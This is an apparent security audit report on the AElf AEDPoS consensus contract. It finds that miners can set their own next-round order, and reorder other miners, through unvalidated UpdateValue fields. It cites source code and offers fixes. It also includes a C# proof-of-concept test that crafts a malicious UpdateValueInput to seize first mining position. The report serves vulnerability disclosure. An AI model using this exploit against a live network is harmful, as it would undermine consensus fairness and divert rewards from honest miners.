# Audit Report

## Title
Miners Can Manipulate FinalOrderOfNextRound to Control Next Round Mining Position

## Summary
The AEDPoS consensus contract allows miners to arbitrarily set their `SupposedOrderOfNextRound` and manipulate other miners' `FinalOrderOfNextRound` values through the `UpdateValue` method without any validation. This bypasses the intended deterministic order calculation based on signature hashes, enabling malicious miners to consistently secure favorable mining positions (e.g., first position) across multiple rounds.

## Finding Description

The AEDPoS consensus mechanism is designed to ensure fair rotation of mining opportunities through deterministic order calculation. According to the expected behavior, a miner's position in the next round should be calculated as [1](#0-0) , ensuring randomness and preventing predictable mining advantages.

However, the `ProcessUpdateValue` method directly accepts miner-provided order values without validation: [2](#0-1) 

Furthermore, miners can modify OTHER miners' positions through the `TuneOrderInformation` field: [3](#0-2) 

The validation provider only checks cryptographic correctness of signatures and hashes, but completely ignores order field validation: [4](#0-3) 

During validation recovery, the system blindly copies the provided order values without recalculating them: [5](#0-4) 

The `NextRoundMiningOrderValidationProvider` only validates that the count of miners with orders matches those who produced blocks, not the correctness of the values themselves: [6](#0-5) 

Most critically, these manipulated values directly determine the mining order in the next round: [7](#0-6) 

The attack flow is straightforward: A malicious miner calls the public `UpdateValue` method [8](#0-7)  with a manually crafted `UpdateValueInput` where they set `SupposedOrderOfNextRound = 1` and use `TuneOrderInformation` to push competing miners to later positions. The only precondition check verifies the miner is in the miner list [9](#0-8) , which any active miner satisfies.

## Impact Explanation

This vulnerability represents a critical breach of consensus integrity with severe consequences:

**Consensus Fairness Violation**: The AEDPoS mechanism's core fairness guarantee—that mining order is determined by unpredictable signature hashes—is completely bypassed. Malicious miners can consistently secure position 1, gaining systematic advantages in transaction ordering, MEV extraction, and block rewards.

**Economic Impact**: The first miner in each round gains priority in transaction selection and fee collection. By consistently mining first, an attacker can extract maximum value from transaction ordering while other honest miners lose their fair share of mining opportunities and associated rewards.

**Protocol Integrity**: This breaks the critical invariant that "miner schedule integrity must be maintained." The deterministic, cryptographically-derived mining order is replaced with arbitrary attacker-controlled values, fundamentally undermining the consensus mechanism's design principles.

**Systemic Risk**: Unlike a one-time attack, this manipulation persists across rounds. Once an attacker establishes favorable positioning, they can maintain it indefinitely, creating a permanent advantage that compounds over time.

## Likelihood Explanation

This vulnerability has HIGH likelihood of exploitation:

**Attacker Accessibility**: Any active miner in the consensus set can execute this attack. The only requirement is being part of the legitimate miner list, which is the normal operating condition for all consensus participants.

**Technical Simplicity**: The attack requires no cryptographic bypasses, complex state manipulation, or sophisticated tooling. An attacker simply needs to construct a custom `UpdateValueInput` message instead of using the helper function `ExtractInformationToUpdateConsensus` [10](#0-9) .

**No Additional Barriers**: The validation system is specifically designed to run during block execution [11](#0-10) , but adds no validators for order fields during `UpdateValue` behavior.

**Low Detection Risk**: The manipulated values appear structurally valid (they're just integers within the valid range). Without explicit comparison against expected calculated values, the manipulation is invisible to on-chain monitoring.

## Recommendation

Implement validation of `SupposedOrderOfNextRound` and `TuneOrderInformation` in the `UpdateValueValidationProvider`:

1. Add a new validation method that recalculates the expected `SupposedOrderOfNextRound` from the miner's signature:
   ```
   var expectedOrder = GetAbsModulus(minerInRound.Signature.ToInt64(), minersCount) + 1;
   if (providedOrder != expectedOrder) {
       return new ValidationResult { Message = "Invalid SupposedOrderOfNextRound" };
   }
   ```

2. Validate that `TuneOrderInformation` only contains entries where legitimate conflicts exist (i.e., where multiple miners calculated the same order from their signatures).

3. Ensure `FinalOrderOfNextRound` values maintain uniqueness and cover the complete range [1, minersCount] without gaps.

4. Consider adding cryptographic commitments to order values in block headers to enable post-execution verification.

## Proof of Concept

```csharp
[Fact]
public async Task MaliciousMiner_CanManipulateMiningOrder()
{
    // Initialize consensus with 3 miners
    await InitializeContracts();
    await InitializeCandidates(3);
    
    // Get current round before manipulation
    var currentRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var maliciousMiner = InitialCoreDataCenterKeyPairs[0];
    var maliciousMinerPubkey = maliciousMiner.PublicKey.ToHex();
    
    // Craft malicious UpdateValueInput with order = 1 (always first)
    var maliciousInput = new UpdateValueInput
    {
        OutValue = HashHelper.ComputeFrom("test_out"),
        Signature = HashHelper.ComputeFrom("test_sig"),
        PreviousInValue = Hash.Empty,
        RoundId = currentRound.RoundId,
        ActualMiningTime = TimestampHelper.GetUtcNow(),
        SupposedOrderOfNextRound = 1,  // Malicious: Always set to 1
        TuneOrderInformation = {  
            // Push other miners to later positions
            { InitialCoreDataCenterKeyPairs[1].PublicKey.ToHex(), 2 },
            { InitialCoreDataCenterKeyPairs[2].PublicKey.ToHex(), 3 }
        },
        ImpliedIrreversibleBlockHeight = 1,
        RandomNumber = ByteString.CopyFrom(await GenerateRandomProofAsync(maliciousMiner))
    };
    
    // Execute malicious UpdateValue - should succeed despite manipulation
    var maliciousStub = GetAEDPoSContractStub(maliciousMiner);
    var result = await maliciousStub.UpdateValue.SendAsync(maliciousInput);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify manipulation succeeded
    var updatedRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    updatedRound.RealTimeMinersInformation[maliciousMinerPubkey]
        .FinalOrderOfNextRound.ShouldBe(1);  // Attacker secured position 1
    
    // Move to next round
    await BootMinerChangeRoundAsync();
    
    // Verify attacker mines first in next round
    var nextRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var firstMiner = nextRound.RealTimeMinersInformation.Values.First(m => m.Order == 1);
    firstMiner.Pubkey.ShouldBe(maliciousMinerPubkey);  // Attack succeeded
}
```

## Notes

This vulnerability affects the core fairness mechanism of the AEDPoS consensus. While the helper function `ExtractInformationToUpdateConsensus` correctly calculates order values, miners are not cryptographically bound to use it. The public nature of `UpdateValue` combined with missing validation creates a direct path to consensus manipulation that any active miner can exploit.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_ApplyNormalConsensusData.cs (L21-21)
```csharp
        var supposedOrderOfNextRound = GetAbsModulus(sigNum, minersCount) + 1;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L246-247)
```csharp
        minerInRound.SupposedOrderOfNextRound = updateValueInput.SupposedOrderOfNextRound;
        minerInRound.FinalOrderOfNextRound = updateValueInput.SupposedOrderOfNextRound;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L259-260)
```csharp
        foreach (var tuneOrder in updateValueInput.TuneOrderInformation)
            currentRound.RealTimeMinersInformation[tuneOrder.Key].FinalOrderOfNextRound = tuneOrder.Value;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L326-328)
```csharp
        if (!currentRound.IsInMinerList(_processingBlockMinerPubkey) &&
            !previousRound.IsInMinerList(_processingBlockMinerPubkey)) // Case a failed miner performing NextTerm
            return false;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/UpdateValueValidationProvider.cs (L10-19)
```csharp
    public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
    {
        // Only one Out Value should be filled.
        if (!NewConsensusInformationFilled(validationContext))
            return new ValidationResult { Message = "Incorrect new Out Value." };

        if (!ValidatePreviousInValue(validationContext))
            return new ValidationResult { Message = "Incorrect previous in value." };

        return new ValidationResult { Success = true };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Recover.cs (L24-27)
```csharp
            RealTimeMinersInformation[information.Key].SupposedOrderOfNextRound =
                information.Value.SupposedOrderOfNextRound;
            RealTimeMinersInformation[information.Key].FinalOrderOfNextRound =
                information.Value.FinalOrderOfNextRound;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/NextRoundMiningOrderValidationProvider.cs (L15-20)
```csharp
        var distinctCount = providedRound.RealTimeMinersInformation.Values.Where(m => m.FinalOrderOfNextRound > 0)
            .Distinct().Count();
        if (distinctCount != providedRound.RealTimeMinersInformation.Values.Count(m => m.OutValue != null))
        {
            validationResult.Message = "Invalid FinalOrderOfNextRound.";
            return validationResult;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L26-36)
```csharp
        foreach (var minerInRound in minersMinedCurrentRound.OrderBy(m => m.FinalOrderOfNextRound))
        {
            var order = minerInRound.FinalOrderOfNextRound;
            nextRound.RealTimeMinersInformation[minerInRound.Pubkey] = new MinerInRound
            {
                Pubkey = minerInRound.Pubkey,
                Order = order,
                ExpectedMiningTime = currentBlockTimestamp.AddMilliseconds(miningInterval.Mul(order)),
                ProducedBlocks = minerInRound.ProducedBlocks,
                MissedTimeSlots = minerInRound.MissedTimeSlots
            };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract.cs (L98-102)
```csharp
    public override Empty UpdateValue(UpdateValueInput input)
    {
        ProcessConsensusInformation(input);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_ExtractInformationToUpdateConsensus.cs (L16-51)
```csharp
    public UpdateValueInput ExtractInformationToUpdateConsensus(string pubkey, ByteString randomNumber)
    {
        if (!RealTimeMinersInformation.ContainsKey(pubkey)) return null;

        var minerInRound = RealTimeMinersInformation[pubkey];

        var tuneOrderInformation = RealTimeMinersInformation.Values
            .Where(m => m.FinalOrderOfNextRound != m.SupposedOrderOfNextRound)
            .ToDictionary(m => m.Pubkey, m => m.FinalOrderOfNextRound);

        var decryptedPreviousInValues = RealTimeMinersInformation.Values.Where(v =>
                v.Pubkey != pubkey && v.DecryptedPieces.ContainsKey(pubkey))
            .ToDictionary(info => info.Pubkey, info => info.DecryptedPieces[pubkey]);

        var minersPreviousInValues =
            RealTimeMinersInformation.Values.Where(info => info.PreviousInValue != null).ToDictionary(
                info => info.Pubkey,
                info => info.PreviousInValue);

        return new UpdateValueInput
        {
            OutValue = minerInRound.OutValue,
            Signature = minerInRound.Signature,
            PreviousInValue = minerInRound.PreviousInValue ?? Hash.Empty,
            RoundId = RoundIdForValidation,
            ProducedBlocks = minerInRound.ProducedBlocks,
            ActualMiningTime = minerInRound.ActualMiningTimes.Last(),
            SupposedOrderOfNextRound = minerInRound.SupposedOrderOfNextRound,
            TuneOrderInformation = { tuneOrderInformation },
            EncryptedPieces = { minerInRound.EncryptedPieces },
            DecryptedPieces = { decryptedPreviousInValues },
            MinersPreviousInValues = { minersPreviousInValues },
            ImpliedIrreversibleBlockHeight = minerInRound.ImpliedIrreversibleBlockHeight,
            RandomNumber = randomNumber
        };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L46-82)
```csharp
        if (extraData.Behaviour == AElfConsensusBehaviour.UpdateValue)
            baseRound.RecoverFromUpdateValue(extraData.Round, extraData.SenderPubkey.ToHex());

        if (extraData.Behaviour == AElfConsensusBehaviour.TinyBlock)
            baseRound.RecoverFromTinyBlock(extraData.Round, extraData.SenderPubkey.ToHex());

        var validationContext = new ConsensusValidationContext
        {
            BaseRound = baseRound,
            CurrentTermNumber = State.CurrentTermNumber.Value,
            CurrentRoundNumber = State.CurrentRoundNumber.Value,
            PreviousRound = TryToGetPreviousRoundInformation(out var previousRound) ? previousRound : new Round(),
            LatestPubkeyToTinyBlocksCount = State.LatestPubkeyToTinyBlocksCount.Value,
            ExtraData = extraData
        };

        /* Ask several questions: */

        // Add basic providers at first.
        var validationProviders = new List<IHeaderInformationValidationProvider>
        {
            // Is sender in miner list (of base round)?
            new MiningPermissionValidationProvider(),

            // Is this block produced in proper time?
            new TimeSlotValidationProvider(),

            // Is sender produced too many blocks at one time?
            new ContinuousBlocksValidationProvider()
        };

        switch (extraData.Behaviour)
        {
            case AElfConsensusBehaviour.UpdateValue:
                validationProviders.Add(new UpdateValueValidationProvider());
                // Is confirmed lib height and lib round number went down? (Which should not happens.)
                validationProviders.Add(new LibInformationValidationProvider());
```
